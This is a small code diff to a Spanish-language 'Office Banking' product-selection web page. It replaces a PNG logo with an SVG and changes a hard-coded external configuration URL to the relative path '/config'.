@@ -41,7 +41,8 @@
 </head>
 <body>
   <div class="productos-box">
-    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+    <!-- Use SVG logo (served as /logo-office-banking.svg) to ensure correct rendering -->
+    <img src="/logo-office-banking.svg" alt="Office Banking" class="logo">
 
     <h2>Selecciona el producto que deseas solicitar</h2>
     <div id="listaProductos"></div>
@@ -52,7 +53,7 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      const API_URL = "https://officebankchilempresas.com/config";
+      const API_URL = "/config";
       const contenedor = document.getElementById("listaProductos");
       const mensaje = document.getElementById("mensaje");
       let tipoAutorizacion = "coordenadas"; // valor por defecto
